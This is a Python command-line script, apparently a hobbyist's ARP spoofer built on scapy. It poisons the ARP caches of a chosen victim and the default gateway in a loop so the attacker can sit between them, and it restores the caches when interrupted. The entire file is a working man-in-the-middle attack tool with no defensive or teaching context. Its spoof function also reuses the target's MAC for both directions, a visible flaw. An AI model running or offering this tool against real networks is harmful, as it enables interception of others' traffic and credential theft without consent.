#!/usr/bin/python3

'''
author : billy_j03l

'''

import time
import scapy.all as scapy
import argparse
import re
import os


def get_ip():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Target_IP/IP_Range")
    parser.add_argument("-d","--default gateway", dest="default_gateway",help="default gateway")
    options=parser.parse_args()
    answers=[]
    if not options.target:
        parser.error("[-] please specify a traget, use --help for info")
    else:
        target_result=re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",options.target)
        if target_result:
            target=target_result.group(0)
            answers.append(target)
        else:
            print("[x] please enter a valid target ip")
            exit(1)
    if not options.default_gateway:
        parser.error("[-] please specefiy the default gateway, use --help for info")
    else:
        gateway_result=re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",options.default_gateway)
        if gateway_result:
            gateway=gateway_result.group(0)
            answers.append(gateway)
        else:
            print("[x] please enter a valid gateway ip")
            exit(1)
    return answers            

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)     
    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast=broadcast/arp_request #combining the two packets using /
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
    
def spoof(target_ip,spoof_ip):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
                    #op=2 ---> arp response
                    #op=1 ---> arp request(default value)
    scapy.send(packet,verbose=False)

def restore(dest_ip,src_ip):   #(victim,gateway)
    dest_mac=get_mac(dest_ip)    #victim
    src_mac=get_mac(src_ip)      #gateway
    restore_packet=scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=src_ip,hwsrc=src_mac)
    scapy.send(restore_packet,count=4,verbose=False)  #inc count allows the victim to receive the restore


os.system("figlet ARPspoofer")
print("\n\t\t\t\t\t by billy_j03l\n\n")

target=get_ip()[0]
gateway=get_ip()[1]
global target_mac
global gateway_mac
target_mac=get_mac(target)
gateway_mac=get_mac(gateway)
sent_packets_counter=2
try:
    print("\nspoofing target...")
    while True:
        spoof(target,gateway)
        spoof(gateway,target)
        print("\r[+] packets sent: ",sent_packets_counter,end="") #for dynamic printing
        time.sleep(1)
        sent_packets_counter+=2
except KeyboardInterrupt:
    print("[+] Detected CTRL+C...")
    print("[+] Resetting ARP cache...")
    restore(target,gateway)
    restore(gateway,target)
    exit()



